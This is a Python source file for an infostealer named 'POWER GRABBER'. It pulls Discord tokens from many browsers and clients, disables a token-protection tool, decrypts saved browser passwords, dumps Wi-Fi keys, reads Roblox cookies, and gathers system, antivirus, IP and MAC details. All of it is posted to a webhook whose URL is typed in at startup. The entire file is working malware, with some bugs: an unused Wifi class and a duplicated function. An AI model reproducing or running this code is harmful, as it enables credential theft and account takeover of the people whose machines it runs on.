import os
import sqlite3
import shutil
import base64
import json
import socket
import win32crypt
import requests
from pathlib import Path
from Cryptodome.Cipher import AES
import zipfile
import time
from win32crypt import CryptUnprotectData
import re
import subprocess
import psutil
import pycountry

hostname = socket.gethostname() 
v4 = socket.gethostbyname(hostname)
if os.name == 'nt':
    temp_path = str(Path(os.environ['USERPROFILE']) / 'Downloads')
elif os.name == 'posix':
    temp_path = str(Path.home() / 'Downloads')
class Wifi:
	def __init__(self):
		self.networks = {}
		self.get_networks()
		self.save_networks()
	def get_networks(self):
		try:
			output_networks = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode(errors='ignore')
			profiles = [line.split(":")[1].strip() for line in output_networks.split("\n") if "Profil" in line]
			for profile in profiles:
				if profile:
					self.networks[profile] = subprocess.check_output(["netsh", "wlan", "show", "profile", profile, "key=clear"]).decode(errors='ignore')
		except Exception:
			pass
	def save_networks(self):
		os.makedirs(os.path.join(temp_path, "Wifi"), exist_ok=True)
		if self.networks:
			for network, info in self.networks.items():			
				with open(os.path.join(temp_path, "Wifi", f"{network}.txt"), "wb") as f:
					f.write(info.encode("utf-8"))
		else:
			with open(os.path.join(temp_path, "Wifi", "No Wifi Networks Found.txt"), "w") as f:
				f.write("No wifi networks found.")
def eip():
    try:
        response = requests.get('https://icanhazip.com')
        ip = response.text.strip()
        return ip
    except requests.RequestException as e:
        print(f"Error: {e}")
        return None
e = eip()
print("    POWER GRABBER")
print("======================")
h00k = input("What is the webhook URL: ")
def get_browser_extensions():
    browsers = ["chrome", "edge", "brave", "opera"]
    all_extensions = []
    for browser in browsers:
        extensions = []
        username = os.getlogin()
        if browser == "chrome":
            extensions_dir = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions"
        elif browser == "edge":
            extensions_dir = f"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Extensions"
        elif browser == "brave":
            extensions_dir = f"C:\\Users\\{username}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Extensions"
        elif browser == "opera":
            extensions_dir = f"C:\\Users\\{username}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Extensions"
        else:
            print(f"{browser} not supported!")
            continue
        if os.path.exists(extensions_dir):
            for extension_id in os.listdir(extensions_dir):
                extension_dir = os.path.join(extensions_dir, extension_id)
                if os.path.exists(extension_dir):
                    manifest_file = os.path.join(extension_dir, 'manifest.json')
                    if os.path.exists(manifest_file):
                        with open(manifest_file, 'r', encoding='utf-8') as f:
                            manifest = json.load(f)
                            extensions.append({
                                'browser': browser,
                                'id': extension_id,
                                'name': manifest.get('name', 'Unknown'),
                                'version': manifest.get('version', 'Unknown')
                            })
        all_extensions.extend(extensions)
    return all_extensions
class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []
        self.killprotector()
        self.grabTokens()
    def killprotector(self):
        path = f"{self.roaming}\\DiscordTokenProtector"
        config = path + "config.json"
        if not os.path.exists(path):
            return
        for process in ["\\DiscordTokenProtector.exe", "\\ProtectionPayload.dll", "\\secure.dat"]:
            try:
                os.remove(path + process)
            except FileNotFoundError:
                pass
        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"
    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
            'Vesktop': self.roaming + '\\vesktop\\sessionData\\Local Storage\\leveldb\\'
        }
        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)
        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)
    def upload(self, webhook):
        for token in self.tokens:
            if token in self.tokens_sent:
                continue
            val = ""
            methods = ""
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token
            }
            user = requests.get(self.baseurl, headers=headers).json()
            payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
            username = user['username']
            discord_id = user['id']
            avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" \
                if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200 \
                else f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
            phone = user['phone']
            email = user['email']
            mfa = ":white_check_mark:" if user.get('mfa_enabled') else ":x:"
            premium_types = {
                0: ":x:",
                1: "Nitro Classic",
                2: "Nitro",
                3: "Nitro Basic"
            }
            nitro = premium_types.get(user.get('premium_type'), ":x:")
            if "message" in payment or payment == []:
                methods = ":x:"
            else:
                methods = "".join(["💳" if method['type'] == 1 else "<:paypal:973417655627288666>" if method['type'] == 2 else ":question:" for method in payment])
            val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Email:** `{email}`\n:mobile_phone: **Phone:** `{phone}`\n\n:closed_lock_with_key: **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{token}`\n'
            data = {
                "embeds": [
                    {
                        "title": "✨⟪POWER GRABBER⟫✨",
                        "color": 0x8B0000,
                        "fields": [
                            {
                                "name": "🪪Discord ID",
                                "value": f"`{discord_id}`"
                            },
                            {
                                "name": "📩Email",
                                "value": f"`{email}`"
                            },
                            {
                                "name": "📱Phone",
                                "value": f"`{phone}`"
                            },
                            {
                                "name": "🔐2FA",
                                "value": f"{mfa}"
                            },
                            {
                                "name": "✨Nitro",
                                "value": f"{nitro}"
                            },
                            {
                                "name": "💳Billing",
                                "value": f"{methods}"
                            },
                            {
                                "name": "🗝️Token",
                                "value": f"`{token}`"
                            },
                            {
                                "name": "👤Username",
                                "value": f"`{username}`"
                            },
                            {
                                "name": "**📡IP details**",
                                "value": " "
                            },
                            {
                                "name": "IPv4:",
                                "value": f"`{v4}`"
                            },
                            {
                                "name": "External IP:",
                                "value": f"`{e}`"
                            },
                            {
                              "name": "💻Get the code ",
                                "value": f"[**`Click here for the code`**](https://github.com/Powercascade/Power-grabber)"
                            },
                            {
                                "name": "🔗Join Power's discord",
                                "value": f"[**`Join`**](https://discord.gg/RXwGjrrDnP)"
                            },
                        ],
                        "thumbnail": {
                            "url": avatar_url
                        },
                    }
                ],
            }
            requests.post(webhook, json=data)
            self.tokens_sent.append(token)
discord_grabber = Discord()
discord_grabber.upload(h00k)
def get_browser_extensions():
    browsers = ["chrome", "edge", "brave", "opera"]
    all_extensions = []
    for browser in browsers:
        extensions = []
        username = os.getlogin()
        if browser == "chrome":
            extensions_dir = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions"
        elif browser == "edge":
            extensions_dir = f"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Extensions"
        elif browser == "brave":
            extensions_dir = f"C:\\Users\\{username}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Extensions"
        elif browser == "opera":
            extensions_dir = f"C:\\Users\\{username}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Extensions"
        else:
            print(f"{browser} not supported!")
            continue
        if os.path.exists(extensions_dir):
            for extension_id in os.listdir(extensions_dir):
                extension_dir = os.path.join(extensions_dir, extension_id)
                if os.path.exists(extension_dir):
                    manifest_file = os.path.join(extension_dir, 'manifest.json')
                    if os.path.exists(manifest_file):
                        with open(manifest_file, 'r', encoding='utf-8') as f:
                            manifest = json.load(f)
                            extensions.append({
                                'browser': browser,
                                'id': extension_id,
                                'name': manifest.get('name', 'Unknown'),
                                'version': manifest.get('version', 'Unknown')
                            })
        all_extensions.extend(extensions)
    return all_extensions
def get_browser_theme_mode():
    browsers = ["chrome", "edge"]
    theme_modes = {}
    for browser in browsers:
        username = os.getlogin()
        theme_mode = "Unknown"
        if browser == "chrome":
            prefs_file = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Preferences"
        elif browser == "edge":
            prefs_file = f"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences"
        else:
            continue
        if os.path.exists(prefs_file):
            with open(prefs_file, 'r', encoding='utf-8') as f:
                prefs = json.load(f)
                theme_mode = prefs.get('profile', {}).get('theme', 'Unknown')
        theme_modes[browser] = theme_mode
    return theme_modes
def get_browser_passwords():
    browsers = ["chrome", "edge", "opera", "brave"]
    all_passwords = []
    for browser in browsers:
        username = os.getlogin()
        login_data_path = None
        local_state_path = None
        if browser == "chrome":
            login_data_path = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
            local_state_path = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
        elif browser == "edge":
            login_data_path = f"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"
            local_state_path = f"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State"
        elif browser == "opera":
            login_data_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data"
            local_state_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State"
        elif browser == "brave":
            login_data_path = f"C:\\Users\\{username}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"
            local_state_path = f"C:\\Users\\{username}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State"
        if login_data_path and os.path.exists(login_data_path) and os.path.exists(local_state_path):
            temp_file = os.path.join(os.getenv('TEMP'), 'Login Data')
            shutil.copy2(login_data_path, temp_file)
            decryption_key = get_decryption_key(local_state_path)
            if decryption_key is None:
                print(f"Failed to extract decryption key for {browser}.")
                continue
            conn = sqlite3.connect(temp_file)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            credentials = []
            for row in cursor.fetchall():
                origin_url = row[0]
                username_value = row[1]
                encrypted_password = row[2]
                if encrypted_password:
                    password = decrypt_password(decryption_key, encrypted_password)
                    if password:
                        credentials.append({
                            'browser': browser,
                            'url': origin_url,
                            'username': username_value,
                            'password': password
                        })
            conn.close()
            os.remove(temp_file)
            all_passwords.extend(credentials)
    return all_passwords
def get_decryption_key(local_state_path):
    try:
        with open(local_state_path, 'r', encoding='utf-8') as file:
            local_state = json.load(file)
        encrypted_key = local_state.get('os_crypt', {}).get('encrypted_key')
        if not encrypted_key:
            print("No encrypted key found in Local State.")
            return None
        encrypted_key = base64.b64decode(encrypted_key)[5:]
        decryption_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decryption_key
    except Exception as e:
        print(f"Error extracting decryption key: {str(e)}")
        return None
def decrypt_password(decryption_key, encrypted_password):
    try:
        encrypted_data = encrypted_password[3:]
        nonce = encrypted_data[:12]
        ciphertext = encrypted_data[12:-16]
        auth_tag = encrypted_data[-16:]
        cipher = AES.new(decryption_key, AES.MODE_GCM, nonce=nonce)
        decrypted_password = cipher.decrypt_and_verify(ciphertext, auth_tag)
        return decrypted_password.decode()
    except Exception as e:
        print(f"Error during password decryption: {str(e)}")
        return None
def get_downloads_info():
    downloads_folder = os.path.join(os.path.expanduser('~'), 'Downloads')
    file_info = []
    if os.path.exists(downloads_folder):
        for filename in os.listdir(downloads_folder):
            file_path = os.path.join(downloads_folder, filename)
            if os.path.isfile(file_path):
                stats = os.stat(file_path)
                file_info.append({
                    'filename': filename,
                    'size': stats.st_size,
                    'created': time.ctime(stats.st_ctime),
                    'modified': time.ctime(stats.st_mtime)
                })
    return file_info

class PcInfo:
    def __init__(self, webhook):
        self.get_system_info(webhook)

    def get_country_code(self, country_name):
        try:
            country = pycountry.countries.lookup(country_name)
            return str(country.alpha_2).lower()
        except LookupError:
            return "white"
        
    def get_all_avs(self) -> str:
        process = subprocess.run("WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName", shell=True, capture_output=True)
        if process.returncode == 0:
            output = process.stdout.decode(errors="ignore").strip().replace("\r\n", "\n").splitlines()
            if len(output) >= 2:
                output = output[1:]
                output = [av.strip() for av in output]
                return ", ".join(output)

    def get_system_info(self, webhook):
        computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
        cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
        gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
        ram = str(round(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,
                  shell=True).stdout.decode(errors='ignore').strip().split()[1]) / (1024 ** 3)))
        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")
        uuid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
        product_key = subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() if subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() != "" else "Failed to get product key"

        try:
            r: dict = requests.get("http://ip-api.com/json/?fields=225545").json()
            if r["status"] != "success":
                raise Exception("Failed")
            country = r["country"]
            proxy = r["proxy"]
            ip = r["query"]   
        except Exception:
            country = "Failed to get country"
            proxy = "Failed to get proxy"
            ip = "Failed to get IP"
                  
        _, addrs = next(iter(psutil.net_if_addrs().items()))
        mac = addrs[0].address

        data = {
            "embeds": [
                {
                    "title": "System Info",
                    "color": 0x8B0000,
                    "fields": [
                        {
                             "name": "Computer data",
                             "value": f''':computer: **PC Username:** `{username}`\n
:desktop: **PC Name:** `{hostname}`\n
:globe_with_meridians: **OS:** `{computer_os}`\n
<:windows:1239719032849174568> **Product Key:** `{product_key}`\n
:flag_{self.get_country_code(country)}: **Country:** `{country}`\n
{":shield:" if proxy else ":x:"} **Proxy:** `{proxy}`\n
:green_apple: **MAC:** `{mac}`\n
:wrench: **UUID:** `{uuid}`\n
<:cpu:1051512676947349525> **CPU:** `{cpu}`\n
<:gpu:1051512654591688815> **GPU:** `{gpu}`\n
<:ram1:1051518404181368972> **RAM:** `{ram}GB`\n
:cop: **Antivirus:** `{self.get_all_avs()}`'''
                        }
                    ],
                }
            ],
        }

        requests.post(webhook, json=data)
webhook_url = h00k
pc_info = PcInfo(webhook_url)
import browser_cookie3
def send_info(self):
    for roblox_cookie in self.roblox_cookies.values():
        headers = {"Cookie": ".ROBLOSECURITY=" + roblox_cookie}
        info = None
        try:
            response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers)
            response.raise_for_status()
            info = response.json()
        except Exception:
            pass
        first_cookie_half = roblox_cookie[:len(roblox_cookie)//2]
        second_cookie_half = roblox_cookie[len(roblox_cookie)//2:]
        if info is not None:
            data = {
                "embeds": [
                    {
                        "title": "Roblox Info",
                        "color": 0x8B0000,
                        "fields": [
                            {
                                "name": "Name:",
                                "value": f"`{info['UserName']}`",
                                "inline": True
                            },
                            {
                                "name": "<:robux_coin:1041813572407283842> Robux:",
                                "value": f"`{info['RobuxBalance']}`",
                                "inline": True
                            },
                            {
                                "name": ":cookie: Cookie:",
                                "value": f"`{first_cookie_half}`",
                                "inline": False
                            },
                            {    
                                "name": "",
                                "value": f"`{second_cookie_half}`",
                                "inline": False
                            },
                        ],
                    }
                ],
            }
            webhook_url = h00k
            response = requests.post(webhook_url, json=data)
def send_to_webhook(file_path):
    webhook_url = h00k
    with open(file_path, 'rb') as f:
        files = {'file': (file_path, f, 'application/zip')}
        response = requests.post(webhook_url, files=files)
        if response.status_code == 200:
            print("File and embed uploaded successfully.")
            print(f"File URL: {response.json()['attachments'][0]['url']}")
        else:
            print(f"Failed to upload file. Status code: {response.status_code}")
            print(response.text)
def save_and_send_info(delete_after_send=True):
    extensions = get_browser_extensions()
    theme_modes = get_browser_theme_mode()
    passwords = get_browser_passwords()
    file_info = get_downloads_info()
    with open("extensions.txt", "w", encoding="utf-8") as file:
        for ext in extensions:
            file.write(f"Browser: {ext['browser']}\n")
            file.write(f"Extension Name: {ext['name']}\n")
            file.write(f"Extension ID: {ext['id']}\n")
            file.write(f"Version: {ext['version']}\n")
            file.write("=" * 50 + "\n")
    with open("theme_mode.txt", "w", encoding="utf-8") as file:
        for browser, mode in theme_modes.items():
            file.write(f"Browser: {browser}\n")
            file.write(f"Theme Mode: {mode}\n")
            file.write("=" * 50 + "\n")
    with open("passwords.txt", "w", encoding="utf-8") as file:
        for password in passwords:
            file.write(f"Browser: {password['browser']}\n")
            file.write(f"URL: {password['url']}\n")
            file.write(f"Username: {password['username']}\n")
            file.write(f"Password: {password['password']}\n")
            file.write("=" * 50 + "\n")
    with open("downloads_info.txt", "w", encoding="utf-8") as file:
        for file_data in file_info:
            file.write(f"Filename: {file_data['filename']}\n")
            file.write(f"Size: {file_data['size']} bytes\n")
            file.write(f"Created: {file_data['created']}\n")
            file.write(f"Modified: {file_data['modified']}\n")
            file.write("=" * 50 + "\n")
    zip_filename = "data.zip"
    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.write("extensions.txt")
        zipf.write("theme_mode.txt")
        zipf.write("passwords.txt")
        zipf.write("downloads_info.txt")
        zipf.write("wifi.txt")
    send_to_webhook(zip_filename)
    if delete_after_send:
        os.remove("extensions.txt")
        os.remove("theme_mode.txt")
        os.remove("passwords.txt")
        os.remove("downloads_info.txt")
        os.remove("wifi.txt")
save_and_send_info(delete_after_send=False)
